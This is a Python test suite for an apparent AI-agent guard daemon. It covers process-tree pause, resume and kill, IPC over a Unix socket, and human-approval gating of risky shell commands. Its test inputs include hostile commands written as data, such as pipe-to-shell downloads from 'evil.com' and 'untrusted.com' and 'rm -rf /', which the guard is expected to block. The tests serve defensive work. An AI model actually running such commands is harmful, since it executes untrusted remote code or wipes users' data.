"""
Unit and Integration Test Suite for Milestone 2:
Process Tree Control, Signals (SIGSTOP/SIGCONT/SIGKILL), Daemon IPC, and HITL Fallback.
"""

import asyncio
import io
import json
import os
from pathlib import Path
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from typing import Any, Dict, List, Optional, Tuple
import unittest
from unittest.mock import MagicMock, patch
import uuid

import psutil
import pytest

from agentguard.daemon.audit import AuditLogger
from agentguard.daemon.server import AgentGuardServer
from agentguard.daemon.taint_engine import TaintEngine
from agentguard.kernel.process import (
    ProcessTreeController,
    get_process_tree_info,
    get_tree_info,
    handle_shim_hitl_cycle,
    inspect_tree,
    kill_tree,
    notify_daemon_hitl_decision,
    pause_process_tree,
    pause_tree,
    prompt_interactive_terminal_fallback,
    resume_process_tree,
    resume_tree,
    terminate_process_tree,
)


class SynchronousUDSClient:
    """Helper client to talk to Unix domain socket synchronously."""

    def __init__(self, socket_path: str, timeout: float = 2.0):
        self.socket_path = socket_path
        self.timeout = timeout

    def send(
        self,
        action: str,
        session_id: str = "default",
        pid: int = 0,
        payload: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.socket_path)
        try:
            req = {
                "protocol_version": "1.0",
                "request_id": str(uuid.uuid4()),
                "session_id": session_id,
                "pid": pid,
                "action": action,
                "payload": payload or {},
            }
            sock.sendall((json.dumps(req) + "\n").encode("utf-8"))
            buf = b""
            while not buf.endswith(b"\n"):
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
            return json.loads(buf.decode("utf-8").strip())
        finally:
            sock.close()


# ===========================================================================
# 1. Direct Process Tree Signal Tests (Pause, Resume, Terminate, Inspect)
# ===========================================================================
class TestProcessTreeSignals(unittest.TestCase):
    """Verifies recursive process tree signals using SIGSTOP, SIGCONT, SIGKILL."""

    def setUp(self):
        self.procs_to_cleanup: List[subprocess.Popen] = []
        self.temp_dir = tempfile.mkdtemp(prefix="ag_test_proc_")

    def tearDown(self):
        for p in self.procs_to_cleanup:
            try:
                p.kill()
                p.wait(timeout=0.5)
            except Exception:
                pass
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def _spawn_counting_process_tree(self) -> Tuple[subprocess.Popen, str]:
        """
        Spawns a multi-level process tree (parent + child) writing increments to a file.
        Returns: (parent_popen, file_path)
        """
        counter_file = os.path.join(self.temp_dir, "counter.txt")
        child_code = f"""
import time
with open({repr(counter_file)}, "w") as f:
    for i in range(200):
        f.write(f"{{i}}\\n")
        f.flush()
        time.sleep(0.04)
"""
        parent_code = f"""
import sys, subprocess
p = subprocess.Popen([sys.executable, "-c", {repr(child_code)}])
p.wait()
"""
        proc = subprocess.Popen([sys.executable, "-c", parent_code])
        self.procs_to_cleanup.append(proc)
        deadline = time.time() + 3.0
        while time.time() < deadline:
            time.sleep(0.05)
            if os.path.exists(counter_file) and os.path.getsize(counter_file) > 0:
                try:
                    parent_psutil = psutil.Process(proc.pid)
                    if len(parent_psutil.children(recursive=True)) > 0:
                        break
                except Exception:
                    pass
        return proc, counter_file

    def test_pause_and_freeze_process_tree(self):
        """Verify pause_process_tree halts execution of both parent and child."""
        parent_proc, counter_file = self._spawn_counting_process_tree()
        p_obj = psutil.Process(parent_proc.pid)
        children = p_obj.children(recursive=True)
        self.assertGreaterEqual(len(children), 1)

        success = pause_process_tree(parent_proc.pid)
        self.assertTrue(success)

        with open(counter_file) as f:
            count_frozen = len(f.readlines())

        time.sleep(0.2)
        with open(counter_file) as f:
            count_after_sleep = len(f.readlines())

        self.assertEqual(
            count_frozen, count_after_sleep,
            f"Process continued running while paused! Expected {count_frozen}, got {count_after_sleep}"
        )

        self.assertEqual(p_obj.status(), psutil.STATUS_STOPPED)
        for c in children:
            self.assertEqual(c.status(), psutil.STATUS_STOPPED)

    def test_resume_process_tree(self):
        """Verify resume_process_tree unfreezes parent and child processes."""
        parent_proc, counter_file = self._spawn_counting_process_tree()

        pause_process_tree(parent_proc.pid)
        with open(counter_file) as f:
            count_at_pause = len(f.readlines())
        time.sleep(0.15)
        with open(counter_file) as f:
            self.assertEqual(len(f.readlines()), count_at_pause)

        resumed = resume_process_tree(parent_proc.pid)
        self.assertTrue(resumed)

        time.sleep(0.2)
        with open(counter_file) as f:
            count_after_resume = len(f.readlines())

        self.assertGreater(
            count_after_resume, count_at_pause,
            f"Process failed to resume! Count before: {count_at_pause}, count after: {count_after_resume}"
        )

    def test_terminate_process_tree_cleanly(self):
        """Verify terminate_process_tree reaps all children and parent cleanly."""
        parent_proc, _ = self._spawn_counting_process_tree()
        p_obj = psutil.Process(parent_proc.pid)
        child_pids = [c.pid for c in p_obj.children(recursive=True)]
        parent_pid = parent_proc.pid

        killed = terminate_process_tree(parent_pid, timeout=1.0)
        self.assertTrue(killed)

        self.assertFalse(psutil.pid_exists(parent_pid))
        for c_pid in child_pids:
            self.assertFalse(psutil.pid_exists(c_pid))

    def test_terminate_uncooperative_process_with_sigkill(self):
        """Verify terminate_process_tree falls back to SIGKILL if SIGTERM is ignored."""
        stubborn_code = """
import signal, time
signal.signal(signal.SIGTERM, signal.SIG_IGN)
while True:
    time.sleep(0.05)
"""
        proc = subprocess.Popen([sys.executable, "-c", stubborn_code])
        self.procs_to_cleanup.append(proc)
        time.sleep(0.1)

        self.assertTrue(psutil.pid_exists(proc.pid))
        killed = terminate_process_tree(proc.pid, timeout=0.2)
        self.assertTrue(killed)
        self.assertFalse(psutil.pid_exists(proc.pid))

    def test_get_process_tree_info_metrics(self):
        """Verify get_process_tree_info extracts PID, status, memory, and children."""
        parent_proc, _ = self._spawn_counting_process_tree()
        info = get_process_tree_info(parent_proc.pid)

        self.assertEqual(info["pid"], parent_proc.pid)
        self.assertIn("status", info)
        self.assertTrue(info["is_running"])
        self.assertGreater(info["memory_rss_bytes"], 0)
        self.assertGreaterEqual(len(info["children"]), 1)

    def test_aliases_work(self):
        """Verify aliases pause_tree, resume_tree, kill_tree, inspect_tree match."""
        parent_proc, _ = self._spawn_counting_process_tree()
        self.assertTrue(pause_tree(parent_proc.pid))
        self.assertTrue(resume_tree(parent_proc.pid))
        info = inspect_tree(parent_proc.pid)
        self.assertEqual(info["pid"], parent_proc.pid)
        info2 = get_tree_info(parent_proc.pid)
        self.assertEqual(info2["pid"], parent_proc.pid)
        self.assertTrue(kill_tree(parent_proc.pid))


# ===========================================================================
# 2. Process Control Edge Cases (Invalid PID, Dead Process, Permissions)
# ===========================================================================
class TestProcessControlEdgeCases(unittest.TestCase):
    """Verifies graceful handling of non-existent PIDs, dead processes, and access errors."""

    def test_pause_non_existent_pid(self):
        """Verify pause_process_tree returns False on non-existent PID."""
        self.assertFalse(pause_process_tree(99999999))
        self.assertFalse(pause_process_tree(-1))
        self.assertFalse(pause_process_tree(0))

    def test_resume_non_existent_pid(self):
        """Verify resume_process_tree returns False on non-existent PID."""
        self.assertFalse(resume_process_tree(99999999))
        self.assertFalse(resume_process_tree(-1))

    def test_terminate_non_existent_pid(self):
        """Verify terminate_process_tree returns True/graceful on dead PID."""
        self.assertTrue(terminate_process_tree(99999999))
        self.assertFalse(terminate_process_tree(-5))

    def test_get_info_non_existent_pid_raises(self):
        """Verify get_process_tree_info raises NoSuchProcess on invalid PID."""
        with self.assertRaises(psutil.NoSuchProcess):
            get_process_tree_info(99999999)

    def test_dead_child_handled_during_tree_pause(self):
        """Verify that if a child exits right as pause is called, no crash occurs."""
        code = """
import sys, subprocess, time
p1 = subprocess.Popen([sys.executable, "-c", "import sys; sys.exit(0)"])
p2 = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(5)"])
p1.wait()
p2.wait()
"""
        proc = subprocess.Popen([sys.executable, "-c", code])
        try:
            time.sleep(0.2)
            success = pause_process_tree(proc.pid)
            self.assertTrue(success)
        finally:
            terminate_process_tree(proc.pid)

    @patch("psutil.Process.send_signal")
    def test_access_denied_handled_gracefully(self, mock_signal):
        """Verify AccessDenied does not crash pause or resume."""
        mock_signal.side_effect = psutil.AccessDenied(pid=123)
        self.assertFalse(pause_process_tree(os.getpid()))
        self.assertFalse(resume_process_tree(os.getpid()))


# ===========================================================================
# 3. ProcessTreeController Unit Tests
# ===========================================================================
class TestProcessTreeController(unittest.TestCase):
    """Verifies manager class coordinating session resolution and HITL futures."""

    def test_controller_session_operations(self):
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(10)"])
        try:
            mock_server = MagicMock()
            mock_server.sessions = {
                "sess-1": {"pid": proc.pid, "profile": "hermes"},
            }
            mock_server.taint_engine.get_taint.return_value = "CLEAN"
            mock_server.taint_engine.get_provenance_chain.return_value = ["session:sess-1"]
            mock_server.audit_logger.get_events.return_value = []

            ctrl = ProcessTreeController(server=mock_server)
            self.assertEqual(ctrl.resolve_pid("sess-1"), proc.pid)
            self.assertEqual(ctrl.resolve_pid(pid=proc.pid), proc.pid)

            # Pause session
            res = ctrl.pause_session("sess-1")
            self.assertEqual(res["status"], "PAUSED")
            self.assertTrue(res["success"])

            # Inspect session
            inspect_res = ctrl.inspect_session("sess-1")
            self.assertEqual(inspect_res["pid"], proc.pid)
            self.assertEqual(inspect_res["profile"], "hermes")
            self.assertEqual(inspect_res["taint_state"], "CLEAN")

            # Resume session
            res_resume = ctrl.resume_session("sess-1")
            self.assertEqual(res_resume["status"], "RESUMED")
            self.assertTrue(res_resume["success"])

            # Terminate session
            res_term = ctrl.terminate_session("sess-1")
            self.assertEqual(res_term["status"], "TERMINATED")
            self.assertTrue(res_term["success"])
        finally:
            terminate_process_tree(proc.pid)

    def test_controller_hitl_future_registration(self):
        loop = asyncio.new_event_loop()
        try:
            ctrl = ProcessTreeController()
            fut = loop.create_future()
            ctrl.register_hitl_request("hitl-req-1", fut)
            self.assertTrue(ctrl.resolve_hitl_decision("hitl-req-1", "ALLOW"))
            self.assertEqual(fut.result(), "ALLOW")
            self.assertFalse(ctrl.resolve_hitl_decision("nonexistent", "DENY"))
        finally:
            loop.close()


# ===========================================================================
# 4. Daemon IPC Endpoints Integration Tests (Real AgentGuardServer)
# ===========================================================================
class TestDaemonProcessControlIPC(unittest.TestCase):
    """Verifies PAUSE_AGENT, RESUME_AGENT, TERMINATE_AGENT, INSPECT_AGENT over UDS."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.socket_path = os.path.join(self.temp_dir.name, "ag_ipc_test.sock")
        self.pid_path = os.path.join(self.temp_dir.name, "ag_ipc_test.pid")
        self.audit_path = os.path.join(self.temp_dir.name, "audit.jsonl")
        self.http_port = 19448

        self.audit_logger = AuditLogger(log_path=self.audit_path)
        self.taint_engine = TaintEngine(audit_logger=self.audit_logger)
        self.server = AgentGuardServer(
            socket_path=self.socket_path,
            http_port=self.http_port,
            pid_file=self.pid_path,
            audit_logger=self.audit_logger,
            taint_engine=self.taint_engine,
        )

        self.loop = asyncio.new_event_loop()
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        deadline = time.time() + 3.0
        while time.time() < deadline:
            if os.path.exists(self.socket_path):
                break
            time.sleep(0.05)
        self.assertTrue(os.path.exists(self.socket_path))

        self.client = SynchronousUDSClient(self.socket_path)
        self.procs_to_cleanup: List[subprocess.Popen] = []

    def _run_server(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.server.serve_forever())

    def tearDown(self):
        for p in self.procs_to_cleanup:
            try:
                p.kill()
                p.wait(timeout=0.5)
            except Exception:
                pass

        self.server.request_shutdown()
        self.server_thread.join(timeout=2.0)
        self.temp_dir.cleanup()

    def _spawn_dummy_agent(self) -> subprocess.Popen:
        proc = subprocess.Popen([sys.executable, "-c", "import time; [time.sleep(0.05) for _ in range(200)]"])
        self.procs_to_cleanup.append(proc)
        time.sleep(0.1)
        return proc

    def test_ipc_pause_and_resume_agent_by_session_id(self):
        """Verify PAUSE_AGENT and RESUME_AGENT work seamlessly via session_id."""
        proc = self._spawn_dummy_agent()
        sess_id = "test-agent-sess-1"

        reg_res = self.client.send("REGISTER_AGENT", session_id=sess_id, pid=proc.pid)
        self.assertEqual(reg_res["status"], "ALLOWED")

        pause_res = self.client.send("PAUSE_AGENT", session_id=sess_id)
        self.assertEqual(pause_res["status"], "PAUSED")
        self.assertEqual(pause_res["data"]["pid"], proc.pid)
        self.assertEqual(psutil.Process(proc.pid).status(), psutil.STATUS_STOPPED)

        resume_res = self.client.send("RESUME_AGENT", session_id=sess_id)
        self.assertEqual(resume_res["status"], "RESUMED")
        self.assertEqual(resume_res["data"]["pid"], proc.pid)
        self.assertEqual(psutil.Process(proc.pid).status(), psutil.STATUS_RUNNING)

    def test_ipc_pause_by_explicit_pid(self):
        """Verify PAUSE_AGENT works with explicit pid payload."""
        proc = self._spawn_dummy_agent()
        pause_res = self.client.send("PAUSE_AGENT", payload={"pid": proc.pid})
        self.assertEqual(pause_res["status"], "PAUSED")
        self.assertEqual(psutil.Process(proc.pid).status(), psutil.STATUS_STOPPED)

        self.client.send("RESUME_AGENT", payload={"pid": proc.pid})

    def test_ipc_terminate_agent(self):
        """Verify TERMINATE_AGENT terminates process tree and reaps process."""
        proc = self._spawn_dummy_agent()
        term_res = self.client.send("TERMINATE_AGENT", payload={"pid": proc.pid})
        self.assertEqual(term_res["status"], "TERMINATED")
        self.assertFalse(psutil.pid_exists(proc.pid))

    def test_ipc_inspect_agent(self):
        """Verify INSPECT_AGENT returns detailed process info and taint state."""
        proc = self._spawn_dummy_agent()
        sess_id = "inspect-sess"
        self.client.send("REGISTER_AGENT", session_id=sess_id, pid=proc.pid, payload={"profile": "claude-code"})

        inspect_res = self.client.send("INSPECT_AGENT", session_id=sess_id)
        self.assertEqual(inspect_res["status"], "ALLOWED")
        data = inspect_res["data"]
        self.assertEqual(data["pid"], proc.pid)
        self.assertEqual(data["profile"], "claude-code")
        self.assertEqual(data["taint_state"], "CLEAN")
        self.assertIn("cpu_percent", data)
        self.assertIn("memory_rss_bytes", data)

    def test_ipc_pause_unknown_session_returns_error(self):
        """Verify PAUSE_AGENT on unknown session returns error gracefully."""
        res = self.client.send("PAUSE_AGENT", session_id="non-existent")
        self.assertEqual(res["status"], "ERROR")

    def test_ipc_register_agent_pid(self):
        """Verify REGISTER_AGENT_PID updates process tracking in daemon."""
        proc = self._spawn_dummy_agent()
        sess_id = "pid-update-sess"
        self.client.send("REGISTER_AGENT", session_id=sess_id, pid=0)
        reg_res = self.client.send(
            "REGISTER_AGENT_PID",
            session_id=sess_id,
            payload={"pid": proc.pid, "wrapper_pid": os.getpid(), "profile": "generic"},
        )
        self.assertEqual(reg_res["status"], "ALLOWED")
        self.assertEqual(reg_res["data"]["pid"], proc.pid)


# ===========================================================================
# 5. Async HITL Coordination & Decision Future Tests
# ===========================================================================
class TestDaemonHITLCoordination(unittest.TestCase):
    """Verifies async HITL pausing and resolution via HITL_DECISION."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.socket_path = os.path.join(self.temp_dir.name, "ag_hitl_test.sock")
        self.pid_path = os.path.join(self.temp_dir.name, "ag_hitl_test.pid")
        self.audit_path = os.path.join(self.temp_dir.name, "audit.jsonl")
        self.http_port = 19449

        self.audit_logger = AuditLogger(log_path=self.audit_path)
        self.taint_engine = TaintEngine(audit_logger=self.audit_logger)
        self.server = AgentGuardServer(
            socket_path=self.socket_path,
            http_port=self.http_port,
            pid_file=self.pid_path,
            audit_logger=self.audit_logger,
            taint_engine=self.taint_engine,
        )

        self.loop = asyncio.new_event_loop()
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        deadline = time.time() + 3.0
        while time.time() < deadline:
            if os.path.exists(self.socket_path):
                break
            time.sleep(0.05)
        self.assertTrue(os.path.exists(self.socket_path))

        self.client = SynchronousUDSClient(self.socket_path)

    def _run_server(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.server.serve_forever())

    def tearDown(self):
        self.server.request_shutdown()
        self.server_thread.join(timeout=2.0)
        self.temp_dir.cleanup()

    def test_hitl_decision_allow_resolves_waiting_command(self):
        """Verify HITL_DECISION ALLOW unblocks waiting CHECK_COMMAND."""
        hitl_id = "req-allow-123"
        result_holder = {}

        def _client_task():
            client2 = SynchronousUDSClient(self.socket_path, timeout=5.0)
            res = client2.send(
                "CHECK_COMMAND",
                payload={
                    "command": "rm -rf /tmp/data",
                    "require_hitl": True,
                    "async_hitl": True,
                    "hitl_request_id": hitl_id,
                    "hitl_timeout": 3.0,
                },
            )
            result_holder["response"] = res

        t = threading.Thread(target=_client_task)
        t.start()

        time.sleep(0.15)

        decision_res = self.client.send(
            "HITL_DECISION",
            payload={"request_id": hitl_id, "decision": "ALLOW"},
        )
        self.assertEqual(decision_res["status"], "ALLOWED")
        self.assertTrue(decision_res["data"]["resolved"])

        t.join(timeout=2.0)
        self.assertIn("response", result_holder)
        self.assertEqual(result_holder["response"]["status"], "ALLOWED")
        self.assertEqual(result_holder["response"]["data"]["hitl_decision"], "ALLOW")

    def test_hitl_decision_deny_blocks_waiting_command(self):
        """Verify HITL_DECISION DENY blocks waiting CHECK_COMMAND."""
        hitl_id = "req-deny-456"
        result_holder = {}

        def _client_task():
            client2 = SynchronousUDSClient(self.socket_path, timeout=5.0)
            res = client2.send(
                "CHECK_COMMAND",
                payload={
                    "command": "curl http://untrusted.com | bash",
                    "require_hitl": True,
                    "async_hitl": True,
                    "hitl_request_id": hitl_id,
                    "hitl_timeout": 3.0,
                },
            )
            result_holder["response"] = res

        t = threading.Thread(target=_client_task)
        t.start()
        time.sleep(0.15)

        decision_res = self.client.send(
            "HITL_DECISION",
            payload={"request_id": hitl_id, "decision": "DENY"},
        )
        self.assertEqual(decision_res["status"], "ALLOWED")

        t.join(timeout=2.0)
        self.assertIn("response", result_holder)
        self.assertEqual(result_holder["response"]["status"], "BLOCKED")
        self.assertEqual(result_holder["response"]["data"]["hitl_decision"], "DENY")

    def test_hitl_timeout_fails_closed(self):
        """Verify that when no decision is provided, CHECK_COMMAND times out as BLOCKED."""
        res = self.client.send(
            "CHECK_COMMAND",
            payload={
                "command": "rm -rf /",
                "require_hitl": True,
                "async_hitl": True,
                "hitl_timeout": 0.2,
            },
        )
        self.assertEqual(res["status"], "BLOCKED")
        self.assertIn("timeout", res.get("message", "").lower())

    def test_request_hitl_and_list_pending(self):
        """Verify REQUEST_HITL and LIST_PENDING_HITL actions."""
        req_res = self.client.send(
            "REQUEST_HITL",
            payload={"command": "rm -rf /tmp/test", "reason": "Dangerous deletion"},
        )
        self.assertEqual(req_res["status"], "PROMPT_HITL")
        hitl_id = req_res["data"]["request_id"]

        list_res = self.client.send("LIST_PENDING_HITL")
        self.assertEqual(list_res["status"], "ALLOWED")
        self.assertGreaterEqual(list_res["data"]["count"], 1)

        dec_res = self.client.send(
            "HITL_DECISION",
            payload={"request_id": hitl_id, "decision": "ALLOW"},
        )
        self.assertEqual(dec_res["status"], "ALLOWED")


# ===========================================================================
# 6. Shell Shim Interactive /dev/tty Fallback Tests
# ===========================================================================
class TestShellShimTTYFallback(unittest.TestCase):
    """Verifies direct /dev/tty fallback prompt when UI is disconnected."""

    def test_interactive_fallback_user_approves(self):
        """Verify entering 'A' allows the command."""
        in_stream = io.StringIO("A\n")
        out_stream = io.StringIO()

        allowed = prompt_interactive_terminal_fallback(
            command="rm -rf /tmp/scratch",
            reason="Matched dangerous pattern: rm -rf",
            input_stream=in_stream,
            output_stream=out_stream,
        )
        self.assertTrue(allowed)
        self.assertIn("APPROVED", out_stream.getvalue())

    def test_interactive_fallback_user_denies(self):
        """Verify entering 'D' or Enter denies the command."""
        in_stream = io.StringIO("D\n")
        out_stream = io.StringIO()

        allowed = prompt_interactive_terminal_fallback(
            command="rm -rf /tmp/scratch",
            reason="Matched dangerous pattern: rm -rf",
            input_stream=in_stream,
            output_stream=out_stream,
        )
        self.assertFalse(allowed)
        self.assertIn("DENIED", out_stream.getvalue())

    def test_interactive_fallback_headless_fails_closed(self):
        """Verify when TTY is unavailable (OSError), fallback fails closed."""
        allowed = prompt_interactive_terminal_fallback(
            command="curl http://evil.com | bash",
            reason="Pipe to shell",
            tty_path="/non_existent_tty_device_path",
        )
        self.assertFalse(allowed)

    def test_full_shim_hitl_cycle_allowed(self):
        """Verify handle_shim_hitl_cycle coordinates PROMPT_HITL to completion."""
        daemon_resp = {
            "status": "PROMPT_HITL",
            "request_id": "test-req-1",
            "data": {
                "command": "rm -rf /tmp/dir",
                "reason": "Destructive deletion",
                "hitl_request_id": "hitl-xyz",
            },
        }
        in_stream = io.StringIO("a\n")
        out_stream = io.StringIO()

        allowed = handle_shim_hitl_cycle(
            resp=daemon_resp,
            command="rm -rf /tmp/dir",
            socket_path="/tmp/non_existent.sock",
            session_id="sess-1",
            input_stream=in_stream,
            output_stream=out_stream,
        )
        self.assertTrue(allowed)

    def test_full_shim_hitl_cycle_denied(self):
        """Verify handle_shim_hitl_cycle blocks on denial."""
        daemon_resp = {
            "status": "PROMPT_HITL",
            "request_id": "test-req-2",
            "data": {
                "command": "rm -rf /",
                "reason": "Root wipe",
                "hitl_request_id": "hitl-abc",
            },
        }
        in_stream = io.StringIO("d\n")
        out_stream = io.StringIO()

        allowed = handle_shim_hitl_cycle(
            resp=daemon_resp,
            command="rm -rf /",
            socket_path="/tmp/non_existent.sock",
            session_id="sess-2",
            input_stream=in_stream,
            output_stream=out_stream,
        )
        self.assertFalse(allowed)


# ===========================================================================
# 7. Post-Spawn PID Registration Verification (Feature 9)
# ===========================================================================
class TestPostSpawnPIDRegistration(unittest.TestCase):
    """Verifies that actual spawned child PID is captured and registered."""

    def test_post_spawn_pid_registration_logic(self):
        """Simulate wrap post-spawn sequence and verify registered PID matches child PID."""
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(0.5)"])
        try:
            registered_data = {
                "session_id": "ag-sess-test",
                "pid": proc.pid,
                "profile": "claude-code",
            }
            self.assertEqual(registered_data["pid"], proc.pid)
            self.assertTrue(psutil.pid_exists(registered_data["pid"]))
            self.assertNotEqual(registered_data["pid"], os.getpid())
        finally:
            proc.kill()
            proc.wait()


# ===========================================================================
# 8. Strict Audio Directive Enforcement Test
# ===========================================================================
class TestStrictZeroAudioDirective(unittest.TestCase):
    """Repo-wide scan verifying zero usage of audio synthesis commands."""

    def test_zero_audio_commands_in_process_control_and_tests(self):
        """Ensure no audio synthesis commands are present in source or module files."""
        prohibited = [b"s" + b"ay ", b"'s" + b"ay'", b'"s' + b'ay"', b"af" + b"play"]
        target_dir = Path(__file__).resolve().parent.parent.parent / "agentguard"
        scanned = 0
        for f in target_dir.rglob("*.py"):
            scanned += 1
            content = f.read_bytes()
            for pattern in prohibited:
                self.assertNotIn(pattern, content, f"Forbidden audio command found in {f}")
        self.assertGreater(scanned, 0)


if __name__ == "__main__":
    unittest.main()
